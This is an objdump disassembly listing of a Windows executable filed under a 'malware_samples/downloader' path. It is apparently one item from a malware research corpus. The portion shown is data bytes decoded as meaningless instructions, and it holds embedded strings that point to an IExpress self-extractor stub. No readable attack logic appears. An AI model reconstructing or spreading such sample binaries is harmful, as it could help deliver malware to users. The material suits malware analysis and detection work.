
malware_samples/downloader/a5acd45c86eb20baf85dfe16dcf019271d0ab2b42bfe02eab4ecb4e06f45a76d.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	00 82 40 00 50 82    	add    %al,-0x7dafffc0(%edx)
  401006:	40                   	inc    %eax
  401007:	00 a4 00 00 00 00 00 	add    %ah,0x0(%eax,%eax,1)
	...
  401042:	00 00                	add    %al,(%eax)
  401044:	04 80                	add    $0x80,%al
  401046:	40                   	inc    %eax
  401047:	00 70 14             	add    %dh,0x14(%eax)
  40104a:	40                   	inc    %eax
  40104b:	00 01                	add    %al,(%ecx)
  40104d:	00 00                	add    %al,(%eax)
  40104f:	00 88 a2 40 00 00    	add    %cl,0x40a2(%eax)
  401055:	00 00                	add    %al,(%eax)
  401057:	00 c8                	add    %cl,%al
  401059:	10 40 00             	adc    %al,0x0(%eax)
  40105c:	1c 00                	sbb    $0x0,%al
  40105e:	00 00                	add    %al,(%eax)
  401060:	00 75 01             	add    %dh,0x1(%ebp)
	...
  4010af:	00 20                	add    %ah,(%eax)
  4010b1:	6a 40                	push   $0x40
	...
  4010bb:	00 b0 69 40 00 40    	add    %dh,0x40004069(%eax)
  4010c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4010c2:	40                   	inc    %eax
  4010c3:	00 00                	add    %al,(%eax)
  4010c5:	00 00                	add    %al,(%eax)
  4010c7:	00 e0                	add    %ah,%al
  4010c9:	19 00                	sbb    %eax,(%eax)
  4010cb:	00 c0                	add    %al,%al
  4010cd:	30 00                	xor    %al,(%eax)
  4010cf:	00 00                	add    %al,(%eax)
  4010d1:	31 00                	xor    %eax,(%eax)
  4010d3:	00 10                	add    %dl,(%eax)
  4010d5:	32 00                	xor    (%eax),%al
  4010d7:	00 50 34             	add    %dl,0x34(%eax)
  4010da:	00 00                	add    %al,(%eax)
  4010dc:	f0 34 00             	lock xor $0x0,%al
  4010df:	00 00                	add    %al,(%eax)
  4010e1:	42                   	inc    %edx
  4010e2:	00 00                	add    %al,(%eax)
  4010e4:	80 49 00 00          	orb    $0x0,0x0(%ecx)
  4010e8:	50                   	push   %eax
  4010e9:	4a                   	dec    %edx
  4010ea:	00 00                	add    %al,(%eax)
  4010ec:	d0 4a 00             	rorb   $1,0x0(%edx)
  4010ef:	00 60 4b             	add    %ah,0x4b(%eax)
  4010f2:	00 00                	add    %al,(%eax)
  4010f4:	c0 4b 00 00          	rorb   $0x0,0x0(%ebx)
  4010f8:	a0 4c 00 00 c0       	mov    0xc000004c,%al
  4010fd:	4c                   	dec    %esp
  4010fe:	00 00                	add    %al,(%eax)
  401100:	d0 4c 00 00          	rorb   $1,0x0(%eax,%eax,1)
  401104:	e0 4f                	loopne 0x401155
  401106:	00 00                	add    %al,(%eax)
  401108:	80 63 00 00          	andb   $0x0,0x0(%ebx)
  40110c:	c0 63 00 00          	shlb   $0x0,0x0(%ebx)
  401110:	60                   	pusha
  401111:	67 00 00             	add    %al,(%bx,%si)
  401114:	b0 69                	mov    $0x69,%al
  401116:	00 00                	add    %al,(%eax)
  401118:	20 6a 00             	and    %ch,0x0(%edx)
  40111b:	00 60 6a             	add    %ah,0x6a(%eax)
  40111e:	00 00                	add    %al,(%eax)
  401120:	e0 6c                	loopne 0x40118e
  401122:	00 00                	add    %al,(%eax)
  401124:	f0 6e                	lock outsb %ds:(%esi),(%dx)
  401126:	00 00                	add    %al,(%eax)
  401128:	40                   	inc    %eax
  401129:	6f                   	outsl  %ds:(%esi),(%dx)
  40112a:	00 00                	add    %al,(%eax)
  40112c:	00 70 00             	add    %dh,0x0(%eax)
  40112f:	00 70 72             	add    %dh,0x72(%eax)
  401132:	00 00                	add    %al,(%eax)
  401134:	a0 72 00 00 00       	mov    0x72,%al
	...
  401141:	00 00                	add    %al,(%eax)
  401143:	00 61 64             	add    %ah,0x64(%ecx)
  401146:	76 61                	jbe    0x4011a9
  401148:	70 69                	jo     0x4011b3
  40114a:	33 32                	xor    (%edx),%esi
  40114c:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40114f:	6c                   	insb   (%dx),%es:(%edi)
  401150:	00 00                	add    %al,(%eax)
  401152:	00 00                	add    %al,(%eax)
  401154:	43                   	inc    %ebx
  401155:	68 65 63 6b 54       	push   $0x546b6365
  40115a:	6f                   	outsl  %ds:(%esi),(%dx)
  40115b:	6b 65 6e 4d          	imul   $0x4d,0x6e(%ebp),%esp
  40115f:	65 6d                	gs insl (%dx),%es:(%edi)
  401161:	62 65 72             	bound  %esp,0x72(%ebp)
  401164:	73 68                	jae    0x4011ce
  401166:	69 70 00 00 00 00 22 	imul   $0x22000000,0x0(%eax),%esi
  40116d:	00 00                	add    %al,(%eax)
  40116f:	00 20                	add    %ah,(%eax)
  401171:	00 00                	add    %al,(%eax)
  401173:	00 2e                	add    %ch,(%esi)
  401175:	49                   	dec    %ecx
  401176:	4e                   	dec    %esi
  401177:	46                   	inc    %esi
  401178:	00 00                	add    %al,(%eax)
  40117a:	00 00                	add    %al,(%eax)
  40117c:	5b                   	pop    %ebx
  40117d:	00 00                	add    %al,(%eax)
  40117f:	00 5d 00             	add    %bl,0x0(%ebp)
  401182:	00 00                	add    %al,(%eax)
  401184:	52                   	push   %edx
  401185:	65 62 6f 6f          	bound  %ebp,%gs:0x6f(%edi)
  401189:	74 00                	je     0x40118b
  40118b:	00 41 64             	add    %al,0x64(%ecx)
  40118e:	76 61                	jbe    0x4011f1
  401190:	6e                   	outsb  %ds:(%esi),(%dx)
  401191:	63 65 64             	arpl   %esp,0x64(%ebp)
  401194:	49                   	dec    %ecx
  401195:	4e                   	dec    %esi
  401196:	46                   	inc    %esi
  401197:	00 56 65             	add    %dl,0x65(%esi)
  40119a:	72 73                	jb     0x40120f
  40119c:	69 6f 6e 00 73 65 74 	imul   $0x74657300,0x6e(%edi),%ebp
  4011a3:	75 70                	jne    0x401215
  4011a5:	78 2e                	js     0x4011d5
  4011a7:	64 6c                	fs insb (%dx),%es:(%edi)
  4011a9:	6c                   	insb   (%dx),%es:(%edi)
  4011aa:	00 00                	add    %al,(%eax)
  4011ac:	73 65                	jae    0x401213
  4011ae:	74 75                	je     0x401225
  4011b0:	70 61                	jo     0x401213
  4011b2:	70 69                	jo     0x40121d
  4011b4:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4011b7:	6c                   	insb   (%dx),%es:(%edi)
  4011b8:	00 00                	add    %al,(%eax)
  4011ba:	00 00                	add    %al,(%eax)
  4011bc:	2e 42                	cs inc %edx
  4011be:	41                   	inc    %ecx
  4011bf:	54                   	push   %esp
  4011c0:	00 00                	add    %al,(%eax)
  4011c2:	00 00                	add    %al,(%eax)
  4011c4:	53                   	push   %ebx
  4011c5:	65 53                	gs push %ebx
  4011c7:	68 75 74 64 6f       	push   $0x6f647475
  4011cc:	77 6e                	ja     0x40123c
  4011ce:	50                   	push   %eax
  4011cf:	72 69                	jb     0x40123a
  4011d1:	76 69                	jbe    0x40123c
  4011d3:	6c                   	insb   (%dx),%es:(%edi)
  4011d4:	65 67 65 00 61 64    	gs add %ah,%gs:0x64(%bx,%di)
  4011da:	76 70                	jbe    0x40124c
  4011dc:	61                   	popa
  4011dd:	63 6b 2e             	arpl   %ebp,0x2e(%ebx)
  4011e0:	64 6c                	fs insb (%dx),%es:(%edi)
  4011e2:	6c                   	insb   (%dx),%es:(%edi)
  4011e3:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  4011e7:	4e                   	dec    %esi
  4011e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4011e9:	64 65 52             	fs gs push %edx
  4011ec:	75 6e                	jne    0x40125c
  4011ee:	44                   	inc    %esp
  4011ef:	4c                   	dec    %esp
  4011f0:	4c                   	dec    %esp
  4011f1:	33 32                	xor    (%edx),%esi
  4011f3:	00 2a                	add    %ch,(%edx)
  4011f5:	00 00                	add    %al,(%eax)
  4011f7:	00 2e                	add    %ch,(%esi)
  4011f9:	00 00                	add    %al,(%eax)
  4011fb:	00 2e                	add    %ch,(%esi)
  4011fd:	2e 00 00             	add    %al,%cs:(%eax)
  401200:	77 69                	ja     0x40126b
  401202:	6e                   	outsb  %ds:(%esi),(%dx)
  401203:	69 6e 69 74 2e 69 6e 	imul   $0x6e692e74,0x69(%esi),%ebp
  40120a:	69 00 25 6c 75 00    	imul   $0x756c25,(%eax),%eax
  401210:	53                   	push   %ebx
  401211:	6f                   	outsl  %ds:(%esi),(%dx)
  401212:	66 74 77             	data16 je 0x40128c
  401215:	61                   	popa
  401216:	72 65                	jb     0x40127d
  401218:	5c                   	pop    %esp
  401219:	4d                   	dec    %ebp
  40121a:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  401221:	74 5c                	je     0x40127f
  401223:	57                   	push   %edi
  401224:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  40122b:	43                   	inc    %ebx
  40122c:	75 72                	jne    0x4012a0
  40122e:	72 65                	jb     0x401295
  401230:	6e                   	outsb  %ds:(%esi),(%dx)
  401231:	74 56                	je     0x401289
  401233:	65 72 73             	gs jb  0x4012a9
  401236:	69 6f 6e 5c 41 70 70 	imul   $0x7070415c,0x6e(%edi),%ebp
  40123d:	20 50 61             	and    %dl,0x61(%eax)
  401240:	74 68                	je     0x4012aa
  401242:	73 00                	jae    0x401244
  401244:	5c                   	pop    %esp
  401245:	00 00                	add    %al,(%eax)
  401247:	00 4b 00             	add    %cl,0x0(%ebx)
  40124a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40124e:	6e                   	outsb  %ds:(%esi),(%dx)
  40124f:	00 65 00             	add    %ah,0x0(%ebp)
  401252:	6c                   	insb   (%dx),%es:(%edi)
  401253:	00 33                	add    %dh,(%ebx)
  401255:	00 32                	add    %dh,(%edx)
  401257:	00 2e                	add    %ch,(%esi)
  401259:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40125d:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  401261:	00 00                	add    %al,(%eax)
  401263:	00 48 65             	add    %cl,0x65(%eax)
  401266:	61                   	popa
  401267:	70 53                	jo     0x4012bc
  401269:	65 74 49             	gs je  0x4012b5
  40126c:	6e                   	outsb  %ds:(%esi),(%dx)
  40126d:	66 6f                	outsw  %ds:(%esi),(%dx)
  40126f:	72 6d                	jb     0x4012de
  401271:	61                   	popa
  401272:	74 69                	je     0x4012dd
  401274:	6f                   	outsl  %ds:(%esi),(%dx)
  401275:	6e                   	outsb  %ds:(%esi),(%dx)
  401276:	00 00                	add    %al,(%eax)
  401278:	54                   	push   %esp
  401279:	49                   	dec    %ecx
  40127a:	54                   	push   %esp
  40127b:	4c                   	dec    %esp
  40127c:	45                   	inc    %ebp
  40127d:	00 00                	add    %al,(%eax)
  40127f:	00 45 58             	add    %al,0x58(%ebp)
  401282:	54                   	push   %esp
  401283:	52                   	push   %edx
  401284:	41                   	inc    %ecx
  401285:	43                   	inc    %ebx
  401286:	54                   	push   %esp
  401287:	4f                   	dec    %edi
  401288:	50                   	push   %eax
  401289:	54                   	push   %esp
  40128a:	00 00                	add    %al,(%eax)
  40128c:	49                   	dec    %ecx
  40128d:	4e                   	dec    %esi
  40128e:	53                   	push   %ebx
  40128f:	54                   	push   %esp
  401290:	41                   	inc    %ecx
  401291:	4e                   	dec    %esi
  401292:	43                   	inc    %ebx
  401293:	45                   	inc    %ebp
  401294:	43                   	inc    %ebx
  401295:	48                   	dec    %eax
  401296:	45                   	inc    %ebp
  401297:	43                   	inc    %ebx
  401298:	4b                   	dec    %ebx
  401299:	00 00                	add    %al,(%eax)
  40129b:	00 56 45             	add    %dl,0x45(%esi)
  40129e:	52                   	push   %edx
  40129f:	43                   	inc    %ebx
  4012a0:	48                   	dec    %eax
  4012a1:	45                   	inc    %ebp
  4012a2:	43                   	inc    %ebx
  4012a3:	4b                   	dec    %ebx
  4012a4:	00 00                	add    %al,(%eax)
  4012a6:	00 00                	add    %al,(%eax)
  4012a8:	44                   	inc    %esp
  4012a9:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  4012ad:	70 74                	jo     0x401323
  4012af:	46                   	inc    %esi
  4012b0:	69 6c 65 41 00 00 00 	imul   $0x0,0x41(%ebp,%eiz,2),%ebp
  4012b7:	00 
  4012b8:	4c                   	dec    %esp
  4012b9:	49                   	dec    %ecx
  4012ba:	43                   	inc    %ebx
  4012bb:	45                   	inc    %ebp
  4012bc:	4e                   	dec    %esi
  4012bd:	53                   	push   %ebx
  4012be:	45                   	inc    %ebp
  4012bf:	00 3c 4e             	add    %bh,(%esi,%ecx,2)
  4012c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4012c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4012c4:	65 3e 00 00          	gs add %al,%ds:(%eax)
  4012c8:	52                   	push   %edx
  4012c9:	45                   	inc    %ebp
  4012ca:	42                   	inc    %edx
  4012cb:	4f                   	dec    %edi
  4012cc:	4f                   	dec    %edi
  4012cd:	54                   	push   %esp
  4012ce:	00 00                	add    %al,(%eax)
  4012d0:	53                   	push   %ebx
  4012d1:	48                   	dec    %eax
  4012d2:	4f                   	dec    %edi
  4012d3:	57                   	push   %edi
  4012d4:	57                   	push   %edi
  4012d5:	49                   	dec    %ecx
  4012d6:	4e                   	dec    %esi
  4012d7:	44                   	inc    %esp
  4012d8:	4f                   	dec    %edi
  4012d9:	57                   	push   %edi
  4012da:	00 00                	add    %al,(%eax)
  4012dc:	41                   	inc    %ecx
  4012dd:	44                   	inc    %esp
  4012de:	4d                   	dec    %ebp
  4012df:	51                   	push   %ecx
  4012e0:	43                   	inc    %ebx
  4012e1:	4d                   	dec    %ebp
  4012e2:	44                   	inc    %esp
  4012e3:	00 55 53             	add    %dl,0x53(%ebp)
  4012e6:	52                   	push   %edx
  4012e7:	51                   	push   %ecx
  4012e8:	43                   	inc    %ebx
  4012e9:	4d                   	dec    %ebp
  4012ea:	44                   	inc    %esp
  4012eb:	00 52 55             	add    %dl,0x55(%edx)
  4012ee:	4e                   	dec    %esi
  4012ef:	50                   	push   %eax
  4012f0:	52                   	push   %edx
  4012f1:	4f                   	dec    %edi
  4012f2:	47                   	inc    %edi
  4012f3:	52                   	push   %edx
  4012f4:	41                   	inc    %ecx
  4012f5:	4d                   	dec    %ebp
  4012f6:	00 00                	add    %al,(%eax)
  4012f8:	50                   	push   %eax
  4012f9:	4f                   	dec    %edi
  4012fa:	53                   	push   %ebx
  4012fb:	54                   	push   %esp
  4012fc:	52                   	push   %edx
  4012fd:	55                   	push   %ebp
  4012fe:	4e                   	dec    %esi
  4012ff:	50                   	push   %eax
  401300:	52                   	push   %edx
  401301:	4f                   	dec    %edi
  401302:	47                   	inc    %edi
  401303:	52                   	push   %edx
  401304:	41                   	inc    %ecx
  401305:	4d                   	dec    %ebp
  401306:	00 00                	add    %al,(%eax)
  401308:	46                   	inc    %esi
  401309:	49                   	dec    %ecx
  40130a:	4e                   	dec    %esi
  40130b:	49                   	dec    %ecx
  40130c:	53                   	push   %ebx
  40130d:	48                   	dec    %eax
  40130e:	4d                   	dec    %ebp
  40130f:	53                   	push   %ebx
  401310:	47                   	inc    %edi
  401311:	00 00                	add    %al,(%eax)
  401313:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  401317:	64 53                	fs push %ebx
  401319:	74 72                	je     0x40138d
  40131b:	69 6e 67 28 29 20 45 	imul   $0x45202928,0x67(%esi),%ebp
  401322:	72 72                	jb     0x401396
  401324:	6f                   	outsl  %ds:(%esi),(%dx)
  401325:	72 2e                	jb     0x401355
  401327:	20 20                	and    %ah,(%eax)
  401329:	43                   	inc    %ebx
  40132a:	6f                   	outsl  %ds:(%esi),(%dx)
  40132b:	75 6c                	jne    0x401399
  40132d:	64 20 6e 6f          	and    %ch,%fs:0x6f(%esi)
  401331:	74 20                	je     0x401353
  401333:	6c                   	insb   (%dx),%es:(%edi)
  401334:	6f                   	outsl  %ds:(%esi),(%dx)
  401335:	61                   	popa
  401336:	64 20 73 74          	and    %dh,%fs:0x74(%ebx)
  40133a:	72 69                	jb     0x4013a5
  40133c:	6e                   	outsb  %ds:(%esi),(%dx)
  40133d:	67 20 72 65          	and    %dh,0x65(%bp,%si)
  401341:	73 6f                	jae    0x4013b2
  401343:	75 72                	jne    0x4013b7
  401345:	63 65 2e             	arpl   %esp,0x2e(%ebp)
  401348:	00 00                	add    %al,(%eax)
  40134a:	00 00                	add    %al,(%eax)
  40134c:	43                   	inc    %ebx
  40134d:	41                   	inc    %ecx
  40134e:	42                   	inc    %edx
  40134f:	49                   	dec    %ecx
  401350:	4e                   	dec    %esi
  401351:	45                   	inc    %ebp
  401352:	54                   	push   %esp
  401353:	00 46 49             	add    %al,0x49(%esi)
  401356:	4c                   	dec    %esp
  401357:	45                   	inc    %ebp
  401358:	53                   	push   %ebx
  401359:	49                   	dec    %ecx
  40135a:	5a                   	pop    %edx
  40135b:	45                   	inc    %ebp
  40135c:	53                   	push   %ebx
  40135d:	00 00                	add    %al,(%eax)
  40135f:	00 50 41             	add    %dl,0x41(%eax)
  401362:	43                   	inc    %ebx
  401363:	4b                   	dec    %ebx
  401364:	49                   	dec    %ecx
  401365:	4e                   	dec    %esi
  401366:	53                   	push   %ebx
  401367:	54                   	push   %esp
  401368:	53                   	push   %ebx
  401369:	50                   	push   %eax
  40136a:	41                   	inc    %ecx
  40136b:	43                   	inc    %ebx
  40136c:	45                   	inc    %ebp
  40136d:	00 00                	add    %al,(%eax)
  40136f:	00 55 50             	add    %dl,0x50(%ebp)
  401372:	52                   	push   %edx
  401373:	4f                   	dec    %edi
  401374:	4d                   	dec    %ebp
  401375:	50                   	push   %eax
  401376:	54                   	push   %esp
  401377:	00 49 58             	add    %cl,0x58(%ecx)
  40137a:	50                   	push   %eax
  40137b:	25 30 33 64 2e       	and    $0x2e643330,%eax
  401380:	54                   	push   %esp
  401381:	4d                   	dec    %ebp
  401382:	50                   	push   %eax
  401383:	00 49 58             	add    %cl,0x58(%ecx)
  401386:	50                   	push   %eax
  401387:	00 69 33             	add    %ch,0x33(%ecx)
  40138a:	38 36                	cmp    %dh,(%esi)
  40138c:	00 00                	add    %al,(%eax)
  40138e:	00 00                	add    %al,(%eax)
  401390:	6d                   	insl   (%dx),%es:(%edi)
  401391:	69 70 73 00 00 00 00 	imul   $0x0,0x73(%eax),%esi
  401398:	61                   	popa
  401399:	6c                   	insb   (%dx),%es:(%edi)
  40139a:	70 68                	jo     0x401404
  40139c:	61                   	popa
  40139d:	00 00                	add    %al,(%eax)
  40139f:	00 70 70             	add    %dh,0x70(%eax)
  4013a2:	63 00                	arpl   %eax,(%eax)
  4013a4:	41                   	inc    %ecx
  4013a5:	3a 5c 00 6d          	cmp    0x6d(%eax,%eax,1),%bl
  4013a9:	73 64                	jae    0x40140f
  4013ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4013ac:	77 6e                	ja     0x40141c
  4013ae:	6c                   	insb   (%dx),%es:(%edi)
  4013af:	64 2e 74 6d          	fs je,pn 0x401420
  4013b3:	70 00                	jo     0x4013b5
  4013b5:	00 00                	add    %al,(%eax)
  4013b7:	00 54 4d 50          	add    %dl,0x50(%ebp,%ecx,2)
  4013bb:	34 33                	xor    $0x33,%al
  4013bd:	35 31 24 2e 54       	xor    $0x542e2431,%eax
  4013c2:	4d                   	dec    %ebp
  4013c3:	50                   	push   %eax
  4013c4:	00 00                	add    %al,(%eax)
  4013c6:	00 00                	add    %al,(%eax)
  4013c8:	52                   	push   %edx
  4013c9:	65 67 53             	gs addr16 push %ebx
  4013cc:	65 72 76             	gs jb  0x401445
  4013cf:	65 72 00             	gs jb  0x4013d2
  4013d2:	00 00                	add    %al,(%eax)
  4013d4:	55                   	push   %ebp
  4013d5:	50                   	push   %eax
  4013d6:	44                   	inc    %esp
  4013d7:	46                   	inc    %esi
  4013d8:	49                   	dec    %ecx
  4013d9:	4c                   	dec    %esp
  4013da:	45                   	inc    %ebp
  4013db:	25 6c 75 00 00       	and    $0x756c,%eax
  4013e0:	43                   	inc    %ebx
  4013e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4013e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4013e3:	74 72                	je     0x401457
  4013e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4013e6:	6c                   	insb   (%dx),%es:(%edi)
  4013e7:	20 50 61             	and    %dl,0x61(%eax)
  4013ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4013eb:	65 6c                	gs insb (%dx),%es:(%edi)
  4013ed:	5c                   	pop    %esp
  4013ee:	44                   	inc    %esp
  4013ef:	65 73 6b             	gs jae 0x40145d
  4013f2:	74 6f                	je     0x401463
  4013f4:	70 5c                	jo     0x401452
  4013f6:	52                   	push   %edx
  4013f7:	65 73 6f             	gs jae 0x401469
  4013fa:	75 72                	jne    0x40146e
  4013fc:	63 65 4c             	arpl   %esp,0x4c(%ebp)
  4013ff:	6f                   	outsl  %ds:(%esi),(%dx)
  401400:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  401403:	65 00 00             	add    %al,%gs:(%eax)
	...
  401412:	00 00                	add    %al,(%eax)
  401414:	e2 60                	loop   0x401476
  401416:	8d 62 00             	lea    0x0(%edx),%esp
  401419:	00 00                	add    %al,(%eax)
  40141b:	00 02                	add    %al,(%edx)
  40141d:	00 00                	add    %al,(%eax)
  40141f:	00 25 00 00 00 74    	add    %ah,0x74000000
  401425:	14 00                	adc    $0x0,%al
  401427:	00 74 08 00          	add    %dh,0x0(%eax,%ecx,1)
  40142b:	00 00                	add    %al,(%eax)
  40142d:	00 00                	add    %al,(%eax)
  40142f:	00 e2                	add    %ah,%dl
  401431:	60                   	pusha
  401432:	8d 62 00             	lea    0x0(%edx),%esp
  401435:	00 00                	add    %al,(%eax)
  401437:	00 0d 00 00 00 d8    	add    %cl,0xd8000000
  40143d:	01 00                	add    %eax,(%eax)
  40143f:	00 9c 14 00 00 9c 08 	add    %bl,0x89c0000(%esp,%edx,1)
  401446:	00 00                	add    %al,(%eax)
  401448:	00 00                	add    %al,(%eax)
  40144a:	00 00                	add    %al,(%eax)
  40144c:	e2 60                	loop   0x4014ae
  40144e:	8d 62 00             	lea    0x0(%edx),%esp
  401451:	00 00                	add    %al,(%eax)
  401453:	00 10                	add    %dl,(%eax)
	...
  40146d:	00 00                	add    %al,(%eax)
  40146f:	00 70 72             	add    %dh,0x72(%eax)
  401472:	00 00                	add    %al,(%eax)
  401474:	52                   	push   %edx
  401475:	53                   	push   %ebx
  401476:	44                   	inc    %esp
  401477:	53                   	push   %ebx
  401478:	ba cd e3 f7 e6       	mov    $0xe6f7e3cd,%edx
  40147d:	ce                   	into
  40147e:	cd fa                	int    $0xfa
  401480:	31 82 00 0d 0a f2    	xor    %eax,-0xdf5f300(%edx)
  401486:	ef                   	out    %eax,(%dx)
  401487:	e5 01                	in     $0x1,%eax
  401489:	00 00                	add    %al,(%eax)
  40148b:	00 77 65             	add    %dh,0x65(%edi)
  40148e:	78 74                	js     0x401504
  401490:	72 61                	jb     0x4014f3
  401492:	63 74 2e 70          	arpl   %esi,0x70(%esi,%ebp,1)
  401496:	64 62 00             	bound  %eax,%fs:(%eax)
  401499:	00 00                	add    %al,(%eax)
  40149b:	00 47 43             	add    %al,0x43(%edi)
  40149e:	54                   	push   %esp
  40149f:	4c                   	dec    %esp
  4014a0:	00 10                	add    %dl,(%eax)
  4014a2:	00 00                	add    %al,(%eax)
  4014a4:	ac                   	lods   %ds:(%esi),%al
  4014a5:	00 00                	add    %al,(%eax)
  4014a7:	00 2e                	add    %ch,(%esi)
  4014a9:	72 64                	jb     0x40150f
  4014ab:	61                   	popa
  4014ac:	74 61                	je     0x40150f
  4014ae:	24 62                	and    $0x62,%al
  4014b0:	72 63                	jb     0x401515
  4014b2:	00 00                	add    %al,(%eax)
  4014b4:	ac                   	lods   %ds:(%esi),%al
  4014b5:	10 00                	adc    %al,(%eax)
  4014b7:	00 04 00             	add    %al,(%eax,%eax,1)
  4014ba:	00 00                	add    %al,(%eax)
  4014bc:	2e 43                	cs inc %ebx
  4014be:	52                   	push   %edx
  4014bf:	54                   	push   %esp
  4014c0:	24 58                	and    $0x58,%al
  4014c2:	43                   	inc    %ebx
  4014c3:	41                   	inc    %ecx
  4014c4:	00 00                	add    %al,(%eax)
  4014c6:	00 00                	add    %al,(%eax)
  4014c8:	b0 10                	mov    $0x10,%al
  4014ca:	00 00                	add    %al,(%eax)
  4014cc:	04 00                	add    $0x0,%al
  4014ce:	00 00                	add    %al,(%eax)
  4014d0:	2e 43                	cs inc %ebx
  4014d2:	52                   	push   %edx
  4014d3:	54                   	push   %esp
  4014d4:	24 58                	and    $0x58,%al
  4014d6:	43                   	inc    %ebx
  4014d7:	41                   	inc    %ecx
  4014d8:	41                   	inc    %ecx
  4014d9:	00 00                	add    %al,(%eax)
  4014db:	00 b4 10 00 00 04 00 	add    %dh,0x40000(%eax,%edx,1)
  4014e2:	00 00                	add    %al,(%eax)
  4014e4:	2e 43                	cs inc %ebx
  4014e6:	52                   	push   %edx
  4014e7:	54                   	push   %esp
  4014e8:	24 58                	and    $0x58,%al
  4014ea:	43                   	inc    %ebx
  4014eb:	5a                   	pop    %edx
  4014ec:	00 00                	add    %al,(%eax)
  4014ee:	00 00                	add    %al,(%eax)
  4014f0:	b8 10 00 00 04       	mov    $0x4000010,%eax
  4014f5:	00 00                	add    %al,(%eax)
  4014f7:	00 2e                	add    %ch,(%esi)
  4014f9:	43                   	inc    %ebx
  4014fa:	52                   	push   %edx
  4014fb:	54                   	push   %esp
  4014fc:	24 58                	and    $0x58,%al
  4014fe:	49                   	dec    %ecx
  4014ff:	41                   	inc    %ecx
  401500:	00 00                	add    %al,(%eax)
  401502:	00 00                	add    %al,(%eax)
  401504:	bc 10 00 00 04       	mov    $0x4000010,%esp
  401509:	00 00                	add    %al,(%eax)
  40150b:	00 2e                	add    %ch,(%esi)
  40150d:	43                   	inc    %ebx
  40150e:	52                   	push   %edx
  40150f:	54                   	push   %esp
  401510:	24 58                	and    $0x58,%al
  401512:	49                   	dec    %ecx
  401513:	41                   	inc    %ecx
  401514:	41                   	inc    %ecx
  401515:	00 00                	add    %al,(%eax)
  401517:	00 c0                	add    %al,%al
  401519:	10 00                	adc    %al,(%eax)
  40151b:	00 04 00             	add    %al,(%eax,%eax,1)
  40151e:	00 00                	add    %al,(%eax)
  401520:	2e 43                	cs inc %ebx
  401522:	52                   	push   %edx
  401523:	54                   	push   %esp
  401524:	24 58                	and    $0x58,%al
  401526:	49                   	dec    %ecx
  401527:	59                   	pop    %ecx
  401528:	00 00                	add    %al,(%eax)
  40152a:	00 00                	add    %al,(%eax)
  40152c:	c4 10                	les    (%eax),%edx
  40152e:	00 00                	add    %al,(%eax)
  401530:	04 00                	add    $0x0,%al
  401532:	00 00                	add    %al,(%eax)
  401534:	2e 43                	cs inc %ebx
  401536:	52                   	push   %edx
  401537:	54                   	push   %esp
  401538:	24 58                	and    $0x58,%al
  40153a:	49                   	dec    %ecx
  40153b:	5a                   	pop    %edx
  40153c:	00 00                	add    %al,(%eax)
  40153e:	00 00                	add    %al,(%eax)
  401540:	c8 10 00 00          	enter  $0x10,$0x0
  401544:	78 00                	js     0x401546
  401546:	00 00                	add    %al,(%eax)
  401548:	2e 67 66 69 64 73 00 	imul   $0x0,%cs:0x73(%si),%sp
  40154f:	00 
  401550:	40                   	inc    %eax
  401551:	11 00                	adc    %eax,(%eax)
  401553:	00 30                	add    %dh,(%eax)
  401555:	03 00                	add    (%eax),%eax
  401557:	00 2e                	add    %ch,(%esi)
  401559:	72 64                	jb     0x4015bf
  40155b:	61                   	popa
  40155c:	74 61                	je     0x4015bf
  40155e:	00 00                	add    %al,(%eax)
  401560:	70 14                	jo     0x401576
  401562:	00 00                	add    %al,(%eax)
  401564:	04 00                	add    $0x0,%al
  401566:	00 00                	add    %al,(%eax)
  401568:	2e 72 64             	jb,pn  0x4015cf
  40156b:	61                   	popa
  40156c:	74 61                	je     0x4015cf
  40156e:	24 73                	and    $0x73,%al
  401570:	78 64                	js     0x4015d6
  401572:	61                   	popa
  401573:	74 61                	je     0x4015d6
  401575:	00 00                	add    %al,(%eax)
  401577:	00 74 14 00          	add    %dh,0x0(%esp,%edx,1)
  40157b:	00 0c 02             	add    %cl,(%edx,%eax,1)
  40157e:	00 00                	add    %al,(%eax)
  401580:	2e 72 64             	jb,pn  0x4015e7
  401583:	61                   	popa
  401584:	74 61                	je     0x4015e7
  401586:	24 7a                	and    $0x7a,%al
  401588:	7a 7a                	jp     0x401604
  40158a:	64 62 67 00          	bound  %esp,%fs:0x0(%edi)
  40158e:	00 00                	add    %al,(%eax)
  401590:	80 16 00             	adcb   $0x0,(%esi)
  401593:	00 38                	add    %bh,(%eax)
  401595:	5c                   	pop    %esp
  401596:	00 00                	add    %al,(%eax)
  401598:	2e 74 65             	je,pn  0x401600
  40159b:	78 74                	js     0x401611
  40159d:	24 6d                	and    $0x6d,%al
  40159f:	6e                   	outsb  %ds:(%esi),(%dx)
  4015a0:	00 00                	add    %al,(%eax)
  4015a2:	00 00                	add    %al,(%eax)
  4015a4:	b8 72 00 00 5c       	mov    $0x5c000072,%eax
  4015a9:	00 00                	add    %al,(%eax)
  4015ab:	00 2e                	add    %ch,(%esi)
  4015ad:	78 64                	js     0x401613
  4015af:	61                   	popa
  4015b0:	74 61                	je     0x401613
  4015b2:	24 78                	and    $0x78,%al
  4015b4:	00 00                	add    %al,(%eax)
  4015b6:	00 00                	add    %al,(%eax)
  4015b8:	00 80 00 00 e0 01    	add    %al,0x1e00000(%eax)
  4015be:	00 00                	add    %al,(%eax)
